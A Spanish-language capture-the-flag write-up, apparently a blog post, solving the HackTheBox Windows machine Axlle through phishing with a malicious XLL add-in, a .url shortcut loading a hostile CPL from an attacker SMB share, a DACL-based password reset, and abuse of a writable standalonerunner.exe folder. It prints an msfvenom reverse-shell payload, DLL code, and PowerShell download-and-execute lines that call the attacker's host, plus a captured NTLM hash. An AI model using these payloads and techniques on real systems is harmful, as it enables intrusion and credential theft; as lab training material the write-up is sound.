@@ -1,0 +1,467 @@
+---
+title: "Máquina Axlle"
+description: "Resolución de la máquina Axlle de HackTheBox"
+tags: ["Phishing", "DACL Abuse", "standalonerunner"]
+categories: ["HackTheBox", "Hard", "Windows"]
+logo: "/assets/writeups/axlle/logo.webp"
+---
+
+Un sitio web que nos permite enviar archivos Excel via mail con datos financieros para ser procesados tiene a un inspector revisando frecuentemente los correos, y dicho inspector no es cuidadoso con lo que recibe. Nos aprovecharemos de él para ganar acceso a la máquina y posteriormente tomar control de ella.
+
+## Reconocimiento
+
+La máquina tiene unos cuantos puertos abiertos. Parece ser un entorno de Active Directory.
+
+```bash
+Nmap scan report for 10.10.11.21
+Host is up, received user-set (0.46s latency).
+Scanned at 2024-06-22 15:01:20 -04 for 550s
+Not shown: 65513 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+25/tcp    open  smtp             syn-ack ttl 127
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+3389/tcp  open  ms-wbt-server    syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49668/tcp open  unknown          syn-ack ttl 127
+49965/tcp open  unknown          syn-ack ttl 127
+49966/tcp open  unknown          syn-ack ttl 127
+50715/tcp open  unknown          syn-ack ttl 127
+62684/tcp open  unknown          syn-ack ttl 127
+62699/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Jun 22 15:10:30 2024 -- 1 IP address (1 host up) scanned in 550.68 seconds
+```
+
+No parece que podamos acceder como usuario anonimo al RPC, LDAP ni SMB. Podemos ver que el sitio web es uno regular.
+
+![Webpage](/assets/writeups/axlle/1.png)
+
+Pero, hay una parte que dice lo siguiente:
+
+![Mails](/assets/writeups/axlle/2.png)
+
+Veamos que hacemos con esto.
+
+## Intrusión
+
+### axlle\\gideon.hamill
+
+Bien, como leímos en la segunda imagen, podemos mandar un documento Excel con facturas o peticiones a `accounts@axlle.htb`, lo que evidentemente es para cuestiones de transacciones. No podemos enviar un documento de Excel con macros ya que como también nos lo indican, están deshabilitados.
+
+Entonces, ¿Qué hacemos? Bien, si buscamos por internet formas que se han utilizado para hacer phishing con documentos de Excel, encontraremos una [muy interesante](https://blog.knowbe4.com/use-of-excel-.xll-add-ins-soars-nearly-600-to-infect-systems-in-phishing-attacks):
+
+![XLL](/assets/writeups/axlle/3.png)
+
+Los archivos de extensión XLL funcionan como los DLLs, solo que estos están especialmente compilados para ser integrados como plugins de Excel, es posible utilizar esto para hacer phishing y ganar ejecución de comandos en equipos remotos. Vamos a intentar usar esto para enviarnos una consola interactiva.
+
+Hay varias formas de poder crear un XLL: puedes utilizar la documentación de Microsoft o directamente herramientas que te crean XLLs especificamente para phishing como [esta](https://github.com/zimnyaa/xyrella)
+
+Podemos crearnos un XLL que nos ejecute un ping primero creando un shellcode para inyectar, se puede hacer fácilmente con msfvenom:
+
+```bash
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.191 LPORT=443 -o payload.bin -f raw
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Saved as: payload.bin
+```
+
+Ahora procedemos a la creación del archivo especial:
+
+```bash
+❯ python build.py -s payload.bin -o invoice.xll
+
+                        _ _       
+                       | | |       
+ _   _ _   _  ____ ____| | | ____ 
+( \ / ) | | |/ ___) _  ) | |/ _  |
+ ) X (| |_| | |  ( (/ /| | ( ( | |
+(_/ \_)\__  |_|   \____)_|_|\_||_|
+      (____/       Nim XLL builder PoC v0.2.1               
+
+| cross-compilation unstable
+| NTDLL unhooking: on
+| hide excel window: off
+| release mode: off
+| generating stageless payload
+| encryption: off
+! should be saved to:  invoice.xll
+```
+
+Enviaremos este "documento" utilizando la herramienta de Linux `swaks` a `accounts@axlle.htb`, mientras que al mismo tiempo nos quedamos esperando por una consola en nuestro netcat que estará en escucha por el puerto 443.
+
+Sin necesidad de credenciales, podremos enviarlo sin problemas:
+
+```bash
+❯ swaks --server 10.10.11.21 --from "uwu@axlle.htb" --to "accounts@axlle.htb" --attach @invoice.xll
+=== Trying 10.10.11.21:25...
+=== Connected to 10.10.11.21.
+<-  220 MAINFRAME ESMTP
+ -> EHLO localhost
+<-  250-MAINFRAME
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> MAIL FROM:<uwu@axlle.htb>
+<-  250 OK
+ -> RCPT TO:<accounts@axlle.htb>
+... [snip]
+-> 
+ -> ------=_MIME_BOUNDARY_000_34944--
+ -> 
+ -> 
+ -> .
+<-  250 Queued (14.376 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+```
+
+y en el listener que hemos dejado en escucha antes, recibiremos esto:
+
+```bash
+❯ rlwrap nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.21 53977
+Microsoft Windows [Version 10.0.20348.2527]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\>
+```
+
+### axlle\\dallon.matrix
+
+Si inspecionamos los archivos del servidor de correo, encontraremos un correo viejo de dallon.matrix que dice lo siguiente:
+
+```bash
+C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F>type "{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml"
+type "{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml"
+Return-Path: webdevs@axlle.htb
+Received: from bumbag (Unknown [192.168.77.153])
+	by MAINFRAME with ESMTP
+	; Mon, 1 Jan 2024 06:32:24 -0800
+Date: Tue, 02 Jan 2024 01:32:23 +1100
+To: dallon.matrix@axlle.htb,calum.scott@axlle.htb,trent.langdon@axlle.htb,dan.kendo@axlle.htb,david.brice@axlle.htb,frankie.rose@axlle.htb,samantha.fade@axlle.htb,jess.adams@axlle.htb,emily.cook@axlle.htb,phoebe.graham@axlle.htb,matt.drew@axlle.htb,xavier.edmund@axlle.htb,baz.humphries@axlle.htb,jacob.greeny@axlle.htb
+From: webdevs@axlle.htb
+Subject: OSINT Application Testing
+Message-Id: <20240102013223.019081@bumbag>
+X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+
+Hi everyone,
+
+The Web Dev group is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.
+
+We ask that you drop any web shortcuts you have into the C:\inetpub\testing folder so we can test the automation.
+
+Yours in click-worthy URLs,
+
+The Web Dev Team
+```
+
+Parece que en `C:\inetpub\testing` hay algo que podemos ver... y justamente podemos hacer cambios en el directorio:
+
+```bash
+C:\inetpub\testing>echo 1 > asd
+echo 1 > asd
+
+C:\inetpub\testing>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is BFF7-F940
+
+ Directory of C:\inetpub\testing
+
+11/15/2024  11:36 AM    <DIR>          .
+01/01/2024  06:33 AM    <DIR>          ..
+11/15/2024  11:36 AM                 4 asd
+               1 File(s)              4 bytes
+               2 Dir(s)   2,827,870,208 bytes free
+```
+
+Vale, si podemos meter links que se van a agregar en un portal y al mismo tiempo serán inspeccionados, entonces podemos intentar colocar algo malicioso en esos links.
+
+Buscando en internet nuevamente, podremos encontrar [este post](https://inquest.net/blog/shortcut-to-malice-url-files/) que habla acerca de algunas campañas de malware que han hecho uso de esto para poder hacer phishing. Una que llama la atención potencialmente es que podemos utilizar esto para hacer que un usuario carge un DLL malicioso. Pero esto no servirá de a primeras.
+
+Para que esto funcione, debemos hacer uso de alguna extensión especial que pueda ser considerada como "algo que no es directamente un programa"; una de estas cosas pueden ser los archivos `cpl`, que sirven como extensiones al panel de control de Windows... vamos a probar.
+
+Como ya habrás visto, un acceso directo de internet contiene esta estructura:
+
+```ini
+[{000214A0-0000-0000-C000-000000000046}]
+Prop3=19,2
+[InternetShortcut]
+IDList=
+URL=https://website.com
+```
+
+Nosotros podemos alterarlo para que nos visite ahora, un recurso en un servidor SMB externo:
+
+```ini
+[{000214A0-0000-0000-C000-000000000046}]
+Prop3=19,2
+[InternetShortcut]
+IDList=
+URL=file://\\<ip>\uwu\test.cpl
+```
+
+Vamos a intentar colar este archivo en el directorio que vimos antes, pero primero creemos un DLL con el siguiente código en C:
+
+```c
+#include <windows.h>
+#include <stdlib.h>
+
+BOOL APIENTRY DllMain(HMODULE handle, DWORD reason, LPVOID reserved){
+  switch(reason){
+    case DLL_PROCESS_ATTACH: {
+       system("powershell IEX((New-Object Net.WebClient).DownloadString('http://<ip>:<port>/file'))");
+    }
+  }
+}
+```
+{: file="test.c" }
+
+Luego de compilarlo y exponerlo en un servidor SMB, ya podremos subir el archivo de acceso directo que hemos creado anteriormente:
+
+```bash
+C:\inetpub\testing>curl -o names.url http://10.10.14.191:8000/thingy.url
+curl -o names.url http://10.10.14.191:8000/thingy.url
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   123  100   123    0     0     39      0  0:00:03  0:00:03 --:--:--    39
+```
+
+y eventualmente:
+
+```bash
+❯ doas smbserver.py -smb2support uwu .
+doas (vzon@pwnedz0n) password: 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.11.21,54088)
+[*] AUTHENTICATE_MESSAGE (AXLLE\dallon.matrix,MAINFRAME)
+[*] User MAINFRAME\dallon.matrix authenticated successfully
+[*] dallon.matrix::AXLLE:aaaaaaaaaaaaaaaa:642ce2e1604c320bc8163a701c00ac09:010100000000000080aa7d769a37db01070521932a3024cb00000000010010005a006b004b0042006900670054004700030010005a006b004b00420069006700540047000200100053006c005500760076006300670076000400100053006c005500760076006300670076000700080080aa7d769a37db0106000400020000000800300030000000000000000100000000200000e5a179cbec00d2364d2a31989e6e69a54e8eadcb3c731c1dc9e738402e39abbe0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100390031000000000000000000
+[*] Connecting Share(1:uwu)
+... [snip]
+```
+
+```bash
+❯ nc -lvnp 8443
+Listening on 0.0.0.0 8443
+Connection received on 10.10.11.21 53977
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+PS C:\> ^Z
+❯ stty raw -echo; fg
+[1]  + 37599 continued  nc -lvnp 8443
+
+PS C:\>
+```
+
+La consola que ejecuto actualmente es una ConPtyShell, por si las dudas.
+
+En la carpeta personal de este usuario podremos encontrar la primera flag.
+
+```bash
+PS C:\Users> cd ~
+PS C:\Users\dallon.matrix> cd Desktop
+PS C:\Users\dallon.matrix\Desktop> dir
+
+
+    Directory: C:\Users\dallon.matrix\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        11/15/2024   2:02 AM             34 user.txt
+
+
+PS C:\Users\dallon.matrix\Desktop> type user.txt
+aedb66f1554568974f87accf0c******
+```
+
+## Escalada de privilegios
+
+### Grupo web devs
+
+Como dallon.matrix, tenemos el siguiente privilegio:
+
+![Change password](/assets/writeups/axlle/4.png)
+
+Podemos cambiar la contraseña de los usuarios `baz.humphries` y `jacob.greeny`... y estos usuarios pueden acceder al servidor por WinRM. Vamos a reiniciarle la contraseña a `jacob.greeny` con powerview para ver que tiene:
+
+```bash
+PS C:\Users\dallon.matrix> $passwd = ConvertTo-SecureString -AsPlainText -Force 'Password123!'
+PS C:\Users\dallon.matrix> Set-DomainUserPassword -Identity jacob.greeny -AccountPassword $passwd
+```
+
+Ahora podemos acceder como este usuario por WinRM.
+
+```bash
+❯ evil-winrm -i 10.10.11.21 -u 'jacob.greeny' -p 'Password123!'
+                                        
+Evil-WinRM shell v3.6
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jacob.greeny\Documents>
+```
+
+### Administrador
+
+No hay nada interesante por la carpeta de este usuario
+
+```bash
+*Evil-WinRM* PS C:\Users\jacob.greeny> dir
+
+
+    Directory: C:\Users\jacob.greeny
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---          5/8/2021   1:20 AM                Desktop
+d-r---          1/1/2024   3:44 AM                Documents
+d-r---          5/8/2021   1:20 AM                Downloads
+d-r---          5/8/2021   1:20 AM                Favorites
+d-r---          5/8/2021   1:20 AM                Links
+d-r---          5/8/2021   1:20 AM                Music
+d-r---         6/13/2024   1:41 AM                OneDrive
+d-r---          5/8/2021   1:20 AM                Pictures
+d-----          5/8/2021   1:20 AM                Saved Games
+d-r---          5/8/2021   1:20 AM                Videos
+```
+
+Pero hay un directorio que posee un código nativo de C para un driver de Windows, se llama `kbfiltr` y está ubicado en `C:\App Development\kbfiltr`. Antes no podíamos acceder a dicho directorio:
+ 
+```bash
+*Evil-WinRM* PS C:\App Development\kbfiltr> dir
+
+
+    Directory: C:\App Development\kbfiltr
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          1/1/2024  10:03 PM                exe
+d-----          1/1/2024  10:03 PM                sys
+-a----        12/14/2023  11:39 AM           2528 kbfiltr.sln
+-a----         6/11/2024  11:16 PM           2805 README.md
+```
+
+Esto nos da indicio de que en esta máquina puede que estén instalados algunos componentes para el desarrollo de software en Windows, y algo que nos da aún más razón para creer esto, es esta nota en el `README.md`:
+
+> NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to test and debug this driver in a standalone environment
+
+Si buscamos por este archivo en internet, nos saldrá que es una utilidad incluida en el kit de drivers de Windows para debuggear y probar drivers. Viendo la ACL de la carpeta donde se encuentra el archivo, encontraremos algo peculiar:
+
+```bash
+*Evil-WinRM* PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64> icacls .
+. AXLLE\App Devs:(OI)(CI)(RX,W)
+  Everyone:(I)(OI)(CI)(R)
+  AXLLE\Administrator:(I)(OI)(CI)(F)
+  BUILTIN\Users:(I)(OI)(CI)(R)
+  AXLLE\App Devs:(I)(OI)(CI)(RX)
+  NT SERVICE\TrustedInstaller:(I)(F)
+  NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+  NT AUTHORITY\SYSTEM:(I)(F)
+  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+  BUILTIN\Administrators:(I)(F)
+  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+  BUILTIN\Users:(I)(RX)
+  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+Tenemos permisos de escritura sobre esta carpeta y nos han dicho que corre de forma automatizada como SYSTEM, lo que quiere decir que básicamente tenemos parcialmente privilegios de administrador porque este binario posee una [vulnerabilidad RCE](https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md), solo falta obtener una consola.
+
+Guiandonos por la página anterior, vamos a movernos donde está este archivo y creemos los archivos necesarios.
+
+```bash
+*Evil-WinRM* PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64> echo testdir > reboot.rsf
+*Evil-WinRM* PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64> echo True >> reboot.rsf
+*Evil-WinRM* PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64> echo 1 > testdir\working\rsf.rsf
+```
+
+Finalmente, crearemos el archivo con el comando que queremos ejecutar:
+
+```bash
+*Evil-WinRM* PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64> echo "powershell IEX((New-Object Net.WebClient).DownloadString('http://<ip>:<port>/uwu'))" > command.txt
+```
+
+Luego, recibiremos otra shell más en unos minutos:
+
+```bash
+❯ nc -lvnp 8443
+Listening on 0.0.0.0 8443
+Connection received on 10.10.11.21 41561
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\testdir\working> ^Z
+[1]  + 59845 suspended  nc -lvnp 8444
+
+❯ stty raw -echo; fg
+[1]  + 59845 continued  nc -lvnp 8444
+
+PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\testdir\working>
+```
+
+Somos el usuario `Administrator`, por lo que ya tenemos control total de la máquina.
+
+```bash
+PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\testdir\working> cd ~
+PS C:\Users\Administrator> whoami
+axlle\administrator
+```
+
+> Un poco contradictorio la verdad, ya que siguiendo al README.md del driver que vimos antes, debería ser SYSTEM.
+{: .prompt-info }
+
+Con esto ya podemos concluir la máquina tomando la última flag.
+
+```bash
+PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        11/15/2024   2:02 AM             34 root.txt
+
+
+PS C:\Users\Administrator\Desktop> type root.txt
+5ffa86fef68106ee8d7aa2953c******
+```
